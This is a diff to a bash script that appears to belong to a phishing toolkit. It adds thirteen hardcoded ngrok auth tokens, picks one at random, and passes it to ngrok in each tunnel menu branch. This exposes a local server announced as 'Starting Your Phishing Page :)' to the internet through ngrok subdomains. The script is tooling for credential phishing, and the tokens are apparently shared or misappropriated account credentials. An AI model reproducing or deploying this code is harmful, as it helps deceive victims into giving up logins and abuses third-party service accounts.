@@ -108,6 +108,20 @@ lnk5="90809kuoq390kz.ngrok.io"
 lnk6="lnk73kozk2993.ngrok.io"
 lnk7="zkol9289272nz.ngrok.io"
 yourlink=$(shuf -e -n1 $lnk $lnk2 $lnk3 $lnk4 $lnk5 $lnk6 $lnk7)
+ng="1nudl2Wh8SymLBprisOdWGjaIsk_YkAHMU78Hc1BF2RHSEw9"
+ng2="1nudwJwzqwXhIl8TQfEl0AZg7Sy_6XXmWmSUpqiMqy1bnqjaY"
+ng3="1nue33iAUK0cxQRZiJIFAGhr8O6_6o64pFwqVM5VQeqK6Akgq"
+ng4="1nueAfJMjFcpjC5FX5Qrbvs4UoA_dwAFmPHgxJ8kbs57tbFj"
+ng5="1nueJAlQY7mxlIZlQbxmN2xavHZ_7WXjSrb2KLfY9dsTAc21U"
+ng6="1nuemkpKo9rnHSDsB4Gxk8bwJe7_GtkupbHjf5CW4ksQCEnZ"
+ng7="1nufRLJl6uFVi8n6ZrB5bVKwS9L_UqbtiL6NQ4PGkXsTSRYS"
+ng8="1o69HHX1AidGy4OoJDEMqV7i6HL_7pC6q2rDrUtEzY7GMePtx"
+ng9="1o69PujhjHgZsQIWlfhUuSPUfQg_57Q3Ega4Ud9uRaeiGm4AM"
+ng10="1o69ZtrnXH0KYBxnEsSrVreNsrx_6xsJB5fFDn4iYwkYnJTL1"
+ng11="1o69irGOLBOcnP4U1GrGSVGCQW2_4ic2HzTi5dkxqx1gwS2xc"
+ng12="1o6AMRSxhNsdiLz76Pi9gFoW4MH_3k9LRESJeM8iNGVszZoZd"
+ng13="1o6AXuAeNK8fzPykUSbeCpLs61l_7imbpBCpaiZmtWUF4xM9M"
+yourauth=$(shuf -e -n1 $ng $ng2 $ng3 $ng4 $ng5 $ng6 $ng7 $ng8 $ng9 $ng10 $ng11 $ng12 $ng13)
 ## Directories
 if [[ ! -d ".server" ]]; then
 	mkdir -p ".server"
@@ -155,7 +169,7 @@ banner() {
 clear
 	cat <<- EOF
             
-                                         __   __            _     _     _               
+                                         
 
 
 __   __      _     _     _               
@@ -397,6 +411,7 @@ tunnel_menu() {
 	if [[ "$REPLY" == 1 || "$REPLY" == 01 ]]; then
 		cp ngrok $HOME
 		cd $HOME
+		./ngrok -authtoken $yourauth
 		python2 -m SimpleHTTPServer >&/dev/null &
 		echo -e "[~] Starting Your Phishing Page :) "
 		srvr=$(./ngrok --http 8000 &)
@@ -406,6 +421,7 @@ tunnel_menu() {
 	elif [[ "$REPLY" == 2 || "$REPLY" == 02 ]]; then
 		cp ngrok $HOME
 		cd $HOME
+		./ngrok -authtoken $yourauth
 		python2 -m SimpleHTTPServer >&/dev/null &
 		echo -e "[~] Starting Your Phishing Page :) "
 		srvr=$(./ngrok --http 8000 &)
@@ -415,6 +431,7 @@ tunnel_menu() {
 	elif [[ "$REPLY" == 3 || "$REPLY" == 03 ]]; then
 		cp ngrok $HOME
 		cd $HOME
+		./ngrok -authtoken $yourauth
 		python2 -m SimpleHTTPServer >&/dev/null &
 		echo -e "[~] Starting Your Phishing Page :) "
 		srvr=$(./ngrok --http 8000 &)
